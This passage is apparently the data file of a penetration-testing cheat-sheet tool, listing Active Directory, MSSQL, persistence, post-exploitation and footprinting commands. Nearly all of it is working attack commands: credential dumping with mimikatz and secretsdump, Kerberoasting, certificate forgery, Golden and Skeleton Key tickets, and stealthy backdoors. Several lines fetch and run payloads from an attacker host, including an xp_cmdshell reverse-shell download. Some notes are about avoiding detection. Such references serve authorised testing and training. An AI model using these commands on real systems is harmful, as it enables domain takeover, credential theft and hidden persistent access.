            name: "Credential Harvesting",
            commands: [
            { id: "adlm8", label: "Dump SAM", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -H $$HASH --sam", notes: "Local account hashes. Built-in Administrator hash often reused across multiple hosts." },
            { id: "adlm9", label: "Dump LSA", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -H $$HASH --lsa", notes: "Service account creds, cached domain logons, DPAPI secrets. High value on servers." },
            { id: "adlm10", label: "Dump LSASS (lsassy)", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -H $$HASH -M lsassy", notes: "Credentials of all users with active sessions — catches DA creds if a session is live." },
            { id: "adlm11", label: "Mimikatz logonpasswords", os: "Windows", command: "mimikatz # sekurlsa::logonpasswords", notes: "Cleartext passwords + hashes from LSASS memory. Requires SeDebugPrivilege / SYSTEM." },
            { id: "adlm12", label: "Mimikatz export tickets", os: "Windows", command: "mimikatz # sekurlsa::tickets /export", notes: "Export Kerberos tickets for pass-the-ticket. Look for DA TGTs in the output." }
            ]
          }
        ],
      },
      {
        id: 'ad-kerberoast-acl',
        name: 'Kerberoasting & ACL Abuse',
        description: 'Attack domain objects via SPN accounts (Kerberoasting) and abusable ACL edges from BloodHound — GenericAll, WriteDACL, ForceChangePassword, GPO write.',
        tags: ['active-directory', 'kerberos', 'acl'],
                subtechniques: [
          {
            id: "adka-kerb",
            name: "Kerberoasting",
            commands: [
            { id: "adka1", label: "Kerberoast — request all TGS", os: "Linux", command: "impacket-GetUserSPNs $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC -request -outputfile kerb.hash", notes: "Request TGS for every SPN account. Prioritize accounts in privileged groups (BloodHound)." },
            { id: "adka2", label: "Crack TGS hash", os: "Linux", command: "hashcat -m 13100 kerb.hash $$WORDLIST", notes: "Mode 13100 = Kerberos TGS-REP (RC4). Add rules for service account naming patterns." }
            ]
          },
          {
            id: "adka-acl",
            name: "ACL Abuse",
            commands: [
            { id: "adka3", label: "ForceChangePassword", os: "Linux", command: "net rpc password \"victim\" \"NewPass123!\" -U \"$$DOMAIN/$$USER%$$PASSWORD\" -S $$DC", notes: "Reset target password without knowing the old one. BloodHound edge: ForceChangePassword." },
            { id: "adka4", label: "Add self to group (GenericAll)", os: "Linux", command: "bloodyAD -d $$DOMAIN -u $$USER -p $$PASSWORD --host $$DC add groupMember \"Target Group\" $$USER", notes: "GenericAll on a group = add yourself directly. Replace \"Target Group\" with the group name from BloodHound." },
            { id: "adka5", label: "Grant DCSync rights (WriteDACL)", os: "Linux", command: "impacket-dacledit -action write -rights DCSync -principal $$USER -target-dn 'DC=corp,DC=local' '$$DOMAIN/$$USER:$$PASSWORD'", notes: "WriteDACL on the domain object = grant yourself replication rights = DCSync. Update the DN for your domain." },
            { id: "adka6", label: "Find writable GPOs", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M gpo_owners", notes: "Find GPOs where you have write access. Each writable GPO = code exec on all computers it applies to." },
            { id: "adka7", label: "GPO abuse (add local admin)", os: "Linux", command: "pyGPOAbuse $$DOMAIN/$$USER:$$PASSWORD -gpo-id $$GPO_GUID --command \"net localgroup administrators $$USER /add\"", notes: "Modify GPO to execute a command on all computers in scope. Use $$GPO_GUID from gpo_owners output." }
            ]
          }
        ],
      },
      {
        id: 'ad-adcs',
        name: 'ADCS Attacks',
        description: 'Certificate abuse via Certipy (ESC1-ESC16) and Shadow Credentials. Forge certificates as any domain user — often the fastest path to Domain Admin.',
        tags: ['active-directory', 'adcs', 'kerberos'],
        subtechniques: [
          {
            id: 'adcs-enum',
            name: 'Enumeration',
            commands: [
              { id: 'adad1', label: 'Find vulnerable ADCS templates', os: 'Linux', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout', notes: 'Lists CA name and vulnerable templates with ESC classification. Save $$CA_NAME and $$ADCS_TEMPLATE from output.' },
              { id: 'adad-e2', label: 'Find CAs and templates (Windows)', os: 'Windows', command: 'certutil -CA', notes: 'List all CAs. Also: Certify.exe find /vulnerable lists vulnerable templates.' },
            ],
          },
          {
            id: 'adcs-esc1',
            name: 'ESC1 — SAN in CSR',
            commands: [
              { id: 'adad2', label: 'Request cert as DA (ESC1)', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template $$ADCS_TEMPLATE -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'ESC1: template allows Subject Alternative Name (SAN) in CSR. Forge cert as any user including Domain Admin.' },
              { id: 'adad3', label: 'Authenticate with cert → NT hash', os: 'Linux', command: 'certipy auth -pfx administrator.pfx -dc-ip $$DC', notes: 'PKINIT auth with the forged cert. Returns NT hash + TGT of the impersonated account.' },
            ],
          },
          {
            id: 'adcs-esc4',
            name: 'ESC4 — Write Template Permissions',
            commands: [
              { id: 'adad-e4a', label: 'Overwrite template to enable SAN (ESC4)', os: 'Linux', command: 'certipy template -u $$USER@$$DOMAIN -p $$PASSWORD -template $$ADCS_TEMPLATE -save-old -dc-ip $$DC', notes: 'ESC4: WriteOwner/WriteDACL/WriteProperty on template. Overwrites template settings to enable SAN (ESC1 condition).' },
              { id: 'adad-e4b', label: 'Request cert via now-vulnerable template', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template $$ADCS_TEMPLATE -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'After ESC4 modification the template is now ESC1-vulnerable. Request a DA cert as normal.' },
              { id: 'adad-e4c', label: 'Restore original template (cleanup)', os: 'Linux', command: 'certipy template -u $$USER@$$DOMAIN -p $$PASSWORD -template $$ADCS_TEMPLATE -configuration $$ADCS_TEMPLATE.json -dc-ip $$DC', notes: 'Restore the saved original config to avoid detection.' },
            ],
          },
          {
            id: 'adcs-esc6',
            name: 'ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2',
            commands: [
              { id: 'adad-e6a', label: 'Check CA flag (ESC6)', os: 'Linux', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout | grep -i EDITF', notes: 'ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set — ANY template allows SAN in CSR, not just ESC1 templates.' },
              { id: 'adad-e6b', label: 'Request cert with SAN (any template)', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template User -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'With ESC6, the standard User template (or any enroll-allowed template) becomes ESC1-equivalent.' },
            ],
          },
          {
            id: 'adcs-esc8',
            name: 'ESC8 — NTLM Relay to AD CS HTTP',
            commands: [
              { id: 'adad-e8a', label: 'Check for AD CS HTTP endpoint', os: 'Linux', command: 'curl -k http://$$DC/certsrv/', notes: 'ESC8: CA web enrollment (certsrv) accessible over HTTP with NTLM auth — relayable.' },
              { id: 'adad-e8b', label: 'Relay NTLM to AD CS (ESC8)', os: 'Linux', command: 'certipy relay -ca $$CA_NAME -template DomainController -dc $$DC', notes: 'Relay DC machine account auth (triggered via printerbug/petitpotam) to AD CS to get a DC certificate → DCSync.' },
              { id: 'adad-e8c', label: 'Trigger DC authentication (PetitPotam)', os: 'Linux', command: 'python3 PetitPotam.py -u $$USER -p $$PASSWORD $$LHOST $$DC', notes: 'Coerces DC to authenticate to your machine. Combine with relay to AD CS endpoint for domain takeover.' },
            ],
          },
          {
            id: 'adcs-shadow',
            name: 'Shadow Credentials',
            commands: [
              { id: 'adad4', label: 'Shadow Credentials (GenericWrite)', os: 'Linux', command: 'certipy shadow auto -u $$USER@$$DOMAIN -p $$PASSWORD -account $$TARGET_HOST -dc-ip $$DC', notes: 'GenericWrite on computer/user → write msDS-KeyCredentialLink → PKINIT → NT hash. No cert template needed.' },
              { id: 'adad-sc2', label: 'Shadow Credentials (Whisker)', os: 'Windows', command: 'Whisker.exe add /target:$$TARGET_HOST', notes: 'Windows version: adds a key credential to target. Run Rubeus.exe asktgt after to get TGT.' },
            ],
          },
        ],
      },
      {
        id: 'ad-cross-trust',
        name: 'Cross-Trust Attacks',
        description: 'Hop from a child domain to the parent/forest root via SID History injection. Run after owning krbtgt of a child domain.',
        tags: ['active-directory', 'kerberos', 'trust'],
                subtechniques: [
          {
            id: "adct-disc",
            name: "Trust Discovery",
            commands: [
            { id: "adct1", label: "Map domain trusts", os: "Windows", command: "nltest /trusted_domains", notes: "Lists all trusted domains from a domain-joined host." },
            { id: "adct2", label: "Map trusts via LDAP", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation", notes: "Enumerate trust relationships remotely via LDAP." },
            { id: "adct3", label: "BloodHound cross-domain edges", os: "Linux", command: "bloodhound-python -u $$USER -p $$PASSWORD -ns $$DC -d $$DOMAIN -c All --zip", notes: "Enable \"Show Cross-Domain Edges\" in BloodHound. Look for paths to Enterprise Admins." }
            ]
          },
          {
            id: "adct-exp",
            name: "Trust Exploitation",
            commands: [
            { id: "adct4", label: "Dump child krbtgt hash", os: "Linux", command: "impacket-secretsdump $$CHILD_DOMAIN/$$USER:$$PASSWORD@$$DC -just-dc-user krbtgt", notes: "Requires DA in child domain. The child krbtgt hash unlocks the parent forest." },
            { id: "adct5", label: "Child→Parent Golden Ticket", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$CHILD_SID -extra-sid $$SID-519 -domain $$CHILD_DOMAIN Administrator", notes: "SID -519 = Enterprise Admins in parent. -extra-sid injects the parent EA SID into the forged ticket." },
            { id: "adct6", label: "Use inter-realm ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Use FQDN not IP. Re-enter the loop in the parent domain from Enterprise Admin position." }
            ]
          },
          {
            id: "adct-fgm",
            name: "Foreign Group Membership",
            commands: [
            { id: "adct7", label: "Find foreign group members (BloodHound)", os: "Any", command: "MATCH (u:User)-[:MemberOf]->(g:Group) WHERE u.domain <> g.domain RETURN u.name, g.name, g.domain", notes: "BloodHound raw Cypher. Finds users from one domain that are members of groups in a different domain." },
            { id: "adct8", label: "Find foreign members (PowerView)", os: "Windows", command: "Get-DomainForeignGroupMember -Domain $$DOMAIN", notes: "Enumerates group members from other domains. Foreign admins are a direct cross-trust privilege path." },
            { id: "adct9", label: "Find foreign admins", os: "Windows", command: "Get-DomainForeignUser -Domain $$DOMAIN", notes: "Lists users from the current domain who are in groups in a foreign domain — high value for lateral movement." },
            { id: "adct10", label: "Enumerate with LDAP", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --groups", notes: "Look for group members with SIDs from a different domain (SID prefix won't match current domain SID)." }
            ]
          }
        ],
      },
      {
        id: 'ad-dcsync',
        name: 'DCSync & Persistence',
        description: 'Domain dominance: dump all hashes, forge Golden Tickets that survive password resets, establish persistent access.',
        tags: ['active-directory', 'dcsync', 'persistence', 'kerberos'],
                subtechniques: [
          {
            id: "addc-sync",
            name: "DCSync",
            commands: [
            { id: "addc1", label: "DCSync — all hashes", os: "Linux", command: "impacket-secretsdump $$DOMAIN/$$USER@$$DC -just-dc", notes: "Replicates NTDS.dit remotely. Requires DA, EA, or DCSync rights granted via dacledit." },
            { id: "addc2", label: "DCSync — krbtgt only", os: "Linux", command: "impacket-secretsdump $$DOMAIN/$$USER@$$DC -just-dc-user krbtgt", notes: "Minimal footprint — pull only the master key needed for Golden Ticket forging." },
            { id: "addc3", label: "DCSync — with hash auth", os: "Linux", command: "impacket-secretsdump $$DOMAIN/$$USER@$$DC -just-dc -hashes :$$HASH", notes: "Use NTLM hash instead of password — works after pass-the-hash lateral movement." },
            { id: "addc4", label: "Full NTDS.dit dump", os: "Linux", command: "impacket-secretsdump $$DOMAIN/$$USER@$$DC", notes: "SAM + LSA + full NTDS.dit — every domain hash and secret in one shot." }
            ]
          },
          {
            id: "addc-gold",
            name: "Golden Ticket",
            commands: [
            { id: "addc5", label: "Forge Golden Ticket", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$SID -domain $$DOMAIN Administrator", notes: "Forge a TGT as Administrator using krbtgt hash. Valid 10 years — survives all resets except krbtgt rotation." },
            { id: "addc6", label: "Use Golden Ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Use FQDN not IP. Rotate krbtgt twice to invalidate — most orgs never do this." }
            ]
          },
          {
            id: "addc-silver",
            name: "Silver Ticket",
            commands: [
            { id: "addc9",  label: "Forge Silver Ticket (Linux)", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$SID -domain $$DOMAIN -spn cifs/$$DC.$$DOMAIN Administrator", notes: "Forges a TGS using the target service account hash. No DC contact — works offline. -spn sets target service (cifs/http/mssql/host)." },
            { id: "addc10", label: "Forge Silver Ticket (Mimikatz)", os: "Windows", command: "mimikatz # kerberos::golden /user:Administrator /domain:$$DOMAIN /sid:$$SID /target:$$DC.$$DOMAIN /service:cifs /rc4:$$HASH /ptt", notes: "kerberos::golden with /service makes a Silver Ticket. /ptt injects directly into memory." },
            { id: "addc11", label: "Use Silver Ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-smbclient -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Silver Ticket is per-service — change -spn and SPN in smbclient/psexec as needed. No krbtgt contact means no DC log." },
            ]
          },
          {
            id: "addc-skel",
            name: "Skeleton Key",
            commands: [
            { id: "addc12", label: "Inject skeleton key (Mimikatz)", os: "Windows", command: "mimikatz # privilege::debug\nmimikatz # misc::skeleton", notes: "Patches LSASS on the DC. Every account now also accepts 'mimikatz' as password. Requires DA on DC. Does not survive DC reboot." },
            { id: "addc13", label: "Remote skeleton key injection", os: "Windows", command: "Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName $$DC", notes: "Remote injection via PowerShell Remoting. DC must allow PS Remoting." },
            { id: "addc14", label: "Bypass LSASS protection first", os: "Windows", command: "mimikatz # privilege::debug\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton", notes: "If RunAsPPL is enabled — use the mimidrv.sys driver (!) to remove protection before injection." },
            { id: "addc15", label: "Authenticate with skeleton password", os: "Any", command: "net use \\\\$$DC\\admin$ /user:$$DOMAIN\\Administrator mimikatz", notes: "Any domain account now also accepts 'mimikatz' as password while skeleton is active." },
            ]
          },
          {
            id: "addc-dsrm",
            name: "DSRM Abuse",
            commands: [
            { id: "addc16", label: "Dump DSRM hash", os: "Windows", command: "mimikatz # token::elevate\nmimikatz # lsadump::sam", notes: "Dumps local SAM on the DC — contains the DSRM Administrator hash. Requires SYSTEM on DC." },
            { id: "addc17", label: "Enable DSRM remote logon", os: "Windows", command: "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD", notes: "Value 2 = DSRM account can log on like a normal local account even when DC is online. Persist this for reuse." },
            { id: "addc18", label: "Pass-the-Hash with DSRM", os: "Windows", command: "mimikatz # sekurlsa::pth /domain:$$DC /user:Administrator /ntlm:$$HASH /run:powershell.exe", notes: "Use DC hostname (not domain) as /domain. DSRM is a LOCAL account — domain must be the machine name." },
            { id: "addc19", label: "Verify registry setting", os: "Windows", command: "Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior", notes: "" },
            ]
          },
          {
            id: "addc-pers",
            name: "Persistence Backdoors",
            commands: [
            { id: "addc7", label: "DCSync backdoor (low-priv user)", os: "Linux", command: "impacket-dacledit -action write -rights DCSync -principal $$USER -target-dn 'DC=corp,DC=local' '$$DOMAIN/$$USER:$$PASSWORD'", notes: "Grant a low-priv account replication rights — persists until explicitly revoked. Update DN for your domain." },
            { id: "addc8", label: "AdminSDHolder persistence", os: "Windows", command: "Add-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=$$DOMAIN\" -PrincipalIdentity $$USER -Rights All", notes: "ACL re-applies to all protected groups every 60 min via SDProp. Extremely stealthy persistent backdoor." }
            ]
          }
        ],
      },
    ],
  },

    /* ── 12. MSSQL ───────────────────────────────────────────────────────────── */
  {
    id: 'mssql',
    name: 'MSSQL',
    icon: '🗃️',
    techniques: [
      {
        id: 'mssql-enum',
        name: 'MSSQL Enumeration',
        description: 'Discover and enumerate MSSQL instances in the domain using PowerUpSQL.',
        tags: ['mssql', 'database', 'active-directory'],
        commands: [
          { id: 'msql1', label: 'Find instances via SPN', os: 'Windows', command: 'Get-SQLInstanceDomain -Verbose', notes: 'PowerUpSQL: finds MSSQL instances via AD SPN query.' },
          { id: 'msql2', label: 'Get server info', os: 'Windows', command: 'Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose', notes: 'Enumerate version, auth type, sysadmin status.' },
          { id: 'msql3', label: 'Check accessibility', os: 'Windows', command: 'Get-SQLInstanceDomain | Get-SQLConnectionTest | ? {$_.Status -eq "Accessible"}', notes: 'Filter to only reachable instances.' },
          { id: 'msql4', label: 'Audit instance', os: 'Windows', command: 'Invoke-SQLAudit -Verbose -Instance $$IP', notes: 'Full PowerUpSQL security audit.' },
        ],
      },
      {
        id: 'mssql-exec',
        name: 'MSSQL Command Execution',
        description: 'Execute OS commands via xp_cmdshell on a SQL Server instance.',
        tags: ['mssql', 'rce', 'xp_cmdshell'],
        commands: [
          { id: 'mex1', label: 'Enable xp_cmdshell', os: 'Windows', command: "Invoke-SQLOSCmd -Instance $$IP -Command \"EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\" -Verbose", notes: 'Requires sysadmin role.' },
          { id: 'mex2', label: 'Run OS command', os: 'Windows', command: 'Invoke-SQLOSCmd -Instance $$IP -Command "whoami" -Verbose', notes: 'PowerUpSQL wrapper for xp_cmdshell.' },
          { id: 'mex3', label: 'Raw xp_cmdshell', os: 'Windows', command: "sqlcmd -S $$IP -Q \"EXEC xp_cmdshell 'whoami'\"", notes: 'Direct xp_cmdshell via sqlcmd.' },
          { id: 'mex4', label: 'Reverse shell via xp_cmdshell', os: 'Windows', command: "EXEC xp_cmdshell 'powershell -c \"iex (New-Object Net.WebClient).DownloadString(\\\"http://$$LHOST/shell.ps1\\\")\"'", notes: 'Drop a reverse shell via xp_cmdshell.' },
        ],
      },
      {
        id: 'mssql-linked',
        name: 'Linked Server Crawl',
        description: 'Crawl linked SQL Server instances to pivot across servers and potentially reach higher-privilege instances.',
        tags: ['mssql', 'lateral-movement', 'linked-servers'],
        commands: [
          { id: 'mlnk1', label: 'Find linked servers', os: 'Windows', command: 'Get-SQLServerLinkCrawl -Instance $$IP -Verbose', notes: 'PowerUpSQL: recursively crawls linked servers.' },
          { id: 'mlnk2', label: 'Execute via linked server', os: 'Windows', command: "SELECT * FROM OPENQUERY(\"<linked-server-name>\", 'SELECT system_user')", notes: 'Query across a linked server.' },
          { id: 'mlnk3', label: 'xp_cmdshell via linked server', os: 'Windows', command: "EXECUTE('EXEC xp_cmdshell ''whoami''') AT \"<linked-server-name>\"", notes: 'Run OS command on a linked server.' },
          { id: 'mlnk4', label: 'Cross-forest linked server exec', os: 'Windows', command: 'Get-SQLServerLinkCrawl -Instance $$IP -Query "exec master..xp_cmdshell \'whoami\'"', notes: 'PowerUpSQL crawl with command execution.' },
        ],
      },
    ],
  },

  /* ── 13. Persistence ─────────────────────────────────────────────────────── */
  {
    id: 'persistence',
    name: 'Persistence',
    icon: '🕳️',
    techniques: [
      {
        id: 'pers-skeleton',
        name: 'Skeleton Key',
        description: 'Patch LSASS on the DC to accept a master password for any account without changing real passwords.',
        tags: ['windows', 'active-directory', 'persistence', 'mimikatz'],
        commands: [
          { id: 'sk1', label: 'Inject skeleton key', os: 'Windows', command: 'mimikatz # privilege::debug\nmimikatz # misc::skeleton', notes: 'Requires DA on the DC. Password becomes "mimikatz".' },
          { id: 'sk2', label: 'Invoke-Mimikatz skeleton', os: 'Windows', command: 'Invoke-Mimikatz -Command \'"privilege::debug" "misc::skeleton"\' -ComputerName $$DC', notes: 'Remote injection via PowerShell.' },
          { id: 'sk3', label: 'Handle protected LSASS', os: 'Windows', command: 'mimikatz # privilege::debug\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton', notes: 'Use mimidriv.sys driver (!) to remove RunAsPPL protection first.' },
          { id: 'sk4', label: 'Authenticate with skeleton key', os: 'Any', command: 'net use \\$$DC\admin$ /user:$$DOMAIN\Administrator mimikatz', notes: 'Any account now accepts "mimikatz" as password.' },
        ],
      },
      {
        id: 'pers-dsrm',
        name: 'DSRM (Directory Services Restore Mode)',
        description: 'Abuse the local DSRM admin account on DCs for persistent backdoor access.',
        tags: ['windows', 'active-directory', 'persistence', 'dsrm'],
        commands: [
          { id: 'dsrm1', label: 'Dump DSRM hash (Mimikatz)', os: 'Windows', command: 'mimikatz # token::elevate\nmimikatz # lsadump::sam', notes: 'Local SAM on DC contains the DSRM admin hash.' },
          { id: 'dsrm2', label: 'Set DsrmAdminLogonBehavior (registry)', os: 'Windows', command: 'New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose', notes: 'Value 2 = allow DSRM account to log on like a normal local account.' },
          { id: 'dsrm3', label: 'Pass-the-Hash with DSRM', os: 'Windows', command: 'mimikatz # sekurlsa::pth /domain:$$DC /user:Administrator /ntlm:$$HASH /run:powershell.exe', notes: 'Use DSRM hash with DC computer name (not domain) as domain.' },
          { id: 'dsrm4', label: 'Check/update registry', os: 'Windows', command: 'Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior', notes: '' },
        ],
      },
      {
        id: 'pers-secdesc',
        name: 'Security Descriptors (Remote Access Backdoors)',
        description: 'Modify security descriptors on WMI, PS Remoting, and registry to allow non-admin remote access — RACE toolkit.',
        tags: ['windows', 'active-directory', 'persistence', 'wmi', 'race'],
                subtechniques: [
          {
            id: "sd-set",
            name: "Set Backdoors (RACE)",
            commands: [
            { id: "sd1", label: "Set-RemoteWMI (RACE)", os: "Windows", command: "Set-RemoteWMI -SamAccountName $$USER -ComputerName $$DC -Verbose", notes: "Grants $$USER WMI access to the DC without DA." },
            { id: "sd2", label: "Set-RemotePSRemoting (RACE)", os: "Windows", command: "Set-RemotePSRemoting -SamAccountName $$USER -ComputerName $$DC -Verbose", notes: "Grants $$USER PS Remoting access to the DC." },
            { id: "sd3", label: "Add-RemoteRegBackdoor (DAMP)", os: "Windows", command: "Add-RemoteRegBackdoor -ComputerName $$DC -Trustee $$USER -Verbose", notes: "Grants remote registry read access — allows hash retrieval." }
            ]
          },
          {
            id: "sd-ret",
            name: "Retrieve via DAMP",
            commands: [
            { id: "sd4", label: "Retrieve machine hash (DAMP)", os: "Windows", command: "Get-RemoteMachineAccountHash -ComputerName $$DC -Verbose", notes: "Retrieve DC machine account hash via DAMP backdoor." },
            { id: "sd5", label: "Retrieve local hash (DAMP)", os: "Windows", command: "Get-RemoteLocalAccountHash -ComputerName $$DC -Verbose", notes: "Retrieve local account hashes remotely via DAMP." },
            { id: "sd6", label: "Retrieve cached creds (DAMP)", os: "Windows", command: "Get-RemoteCachedCredential -ComputerName $$DC -Verbose", notes: "Retrieve cached domain credentials via DAMP." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 14. Post-Exploitation ───────────────────────────────────────────────── */
  {
    id: 'post-exploit',
    name: 'Post-Exploitation',
    icon: '🏴',
    techniques: [
      {
        id: 'post-enum-linux',
        name: 'Linux Enumeration',
        description: 'Gather system information after gaining a foothold on a Linux host.',
        tags: ['linux', 'enumeration'],
        commands: [
          { id: 'le1', label: 'System info', os: 'Linux', command: 'uname -a; id; hostname; cat /etc/passwd | grep -v nologin', notes: '' },
          { id: 'le2', label: 'Network info', os: 'Linux', command: 'ip a; ss -tlnp; cat /etc/hosts', notes: '' },
          { id: 'le3', label: 'SUID / capabilities', os: 'Linux', command: 'find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null', notes: '' },
          { id: 'le4', label: 'LinPEAS', os: 'Linux', command: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh', notes: 'Comprehensive automated enumeration.' },
        ],
      },
      {
        id: 'post-enum-win',
        name: 'Windows Enumeration',
        description: 'Gather system information after gaining a foothold on a Windows host.',
        tags: ['windows', 'enumeration'],
        commands: [
          { id: 'we1', label: 'System info', os: 'Windows', command: 'systeminfo; whoami /all; net user; net localgroup administrators', notes: '' },
          { id: 'we2', label: 'Network info', os: 'Windows', command: 'ipconfig /all; netstat -ano; arp -a', notes: '' },
          { id: 'we3', label: 'WinPEAS', os: 'Windows', command: 'winPEASany.exe quiet', notes: 'Comprehensive automated enumeration.' },
          { id: 'we4', label: 'PowerUp (AllChecks)', os: 'Windows', command: 'Import-Module PowerUp.ps1; Invoke-AllChecks', notes: 'PowerShell privesc checks.' },
        ],
      },
      {
        id: 'post-transfer',
        name: 'File Transfer',
        description: 'Move tools and loot between attacker and target.',
        tags: ['file-transfer', 'linux', 'windows'],
                subtechniques: [
          {
            id: "ft-dl",
            name: "Download & Serve",
            commands: [
            { id: "ft1", label: "Python HTTP server", os: "Linux", command: "python3 -m http.server 80", notes: "Serve files from current directory." },
            { id: "ft2", label: "Download (Linux wget)", os: "Linux", command: "wget http://$$LHOST/file.sh -O /tmp/file.sh", notes: "" },
            { id: "ft3", label: "Download (PowerShell IWR)", os: "Windows", command: "Invoke-WebRequest -Uri http://$$LHOST/file.exe -OutFile C:Temp\file.exe", notes: "" },
            { id: "ft4", label: "Download (certutil)", os: "Windows", command: "certutil -urlcache -split -f http://$$LHOST/file.exe C:Temp\file.exe", notes: "LOLbin — often allowed." }
            ]
          },
          {
            id: "ft-smb",
            name: "SMB & Remote",
            commands: [
            { id: "ft5", label: "Upload via SCP", os: "Linux", command: "scp file.txt $$USER@$$IP:/tmp/file.txt", notes: "" },
            { id: "ft6", label: "xcopy from share", os: "Windows", command: "xcopy \\$$LHOSTshareTools C:Temp /E /I", notes: "Copy tools from attacker SMB share." }
            ]
          },
          {
            id: "ft-mem",
            name: "In-Memory Execution",
            commands: [
            { id: "ft7", label: "portproxy (pivot HTTP)", os: "Windows", command: "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=$$LHOST", notes: "Relay port 8080 → attacker:80 for pivoting through a compromised host." },
            { id: "ft8", label: "NetLoader (in-memory)", os: "Windows", command: "C:UsersPublicLoader.exe -path http://$$LHOST/tool.exe", notes: "Fetch and run in memory via NetLoader — no disk write." },
            { id: "ft9", label: "Download (PS WebClient)", os: "Windows", command: "(New-Object Net.WebClient).DownloadFile(\"http://$$LHOST/file.exe\",\"C:Temp\file.exe\")", notes: "" },
            { id: "ft10", label: "IEX in-memory load", os: "Windows", command: "iex (iwr http://$$LHOST/script.ps1 -UseBasicParsing)", notes: "Execute script in memory without touching disk." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 15. Footprinting ───────────────────────────────────────────────────── */
  {
    id: 'footprinting',
    name: 'Footprinting',
    icon: '👣',
    techniques: [
      {
        id: 'fp-principles',
        name: 'Enumeration Principles',
        description: 'Core methodology: enumerate infrastructure, then services, then hosts. The goal is to understand the attack surface before exploiting it.',
        tags: ['methodology', 'enumeration', 'osint'],
        commands: [
          { id: 'fpp1', label: 'WHOIS lookup', os: 'Linux', command: 'whois $$DOMAIN', notes: 'Registrant, nameservers, contact info.' },
          { id: 'fpp2', label: 'ASN / netblock lookup', os: 'Linux', command: 'whois -h whois.cymru.com " -v $$IP"', notes: 'Identify the ASN and org owning the IP.' },
          { id: 'fpp3', label: 'BGP Toolkit (online)', os: 'Any', command: 'https://bgp.he.net/ip/$$IP', notes: 'Hurricane Electric BGP toolkit — ASN, peers, prefixes.' },
          { id: 'fpp4', label: 'Shodan search', os: 'Any', command: 'shodan search hostname:$$DOMAIN', notes: 'Find exposed services in Shodan.' },
          { id: 'fpp5', label: 'Certificate transparency', os: 'Any', command: 'curl -s "https://crt.sh/?q=$$DOMAIN&output=json" | jq ".[].name_value" | sort -u', notes: 'Find subdomains from SSL cert logs.' },
          { id: 'fpp6', label: 'theHarvester', os: 'Linux', command: 'theHarvester -d $$DOMAIN -l 500 -b all', notes: 'Harvest emails, subdomains, hosts, employee names.' },
        ],
      },
      {
        id: 'fp-infra',
        name: 'Infrastructure-Based Enumeration',
        description: 'Enumerate DNS infrastructure, virtual hosts, cloud assets, and public-facing services.',
        tags: ['dns', 'vhost', 'cloud', 'enumeration'],
        commands: [
          { id: 'fpi1', label: 'DNS brute (subfinder)', os: 'Linux', command: 'subfinder -d $$DOMAIN -v', notes: 'Fast passive subdomain enumeration.' },
          { id: 'fpi2', label: 'DNS brute (amass)', os: 'Linux', command: 'amass enum -d $$DOMAIN', notes: 'Comprehensive subdomain discovery.' },
          { id: 'fpi3', label: 'Reverse DNS lookup', os: 'Linux', command: 'for i in $(seq 1 254); do host $$IP.$i; done | grep -v "not found"', notes: 'Enumerate PTR records for a /24.' },
          { id: 'fpi4', label: 'Virtual host fuzz', os: 'Linux', command: 'gobuster vhost -u http://$$IP -w $$WORDLIST', notes: 'Find vhosts not in DNS.' },
          { id: 'fpi5', label: 'Cloud asset check (S3)', os: 'Linux', command: 'aws s3 ls s3://$$DOMAIN --no-sign-request', notes: 'Check for public S3 buckets.' },
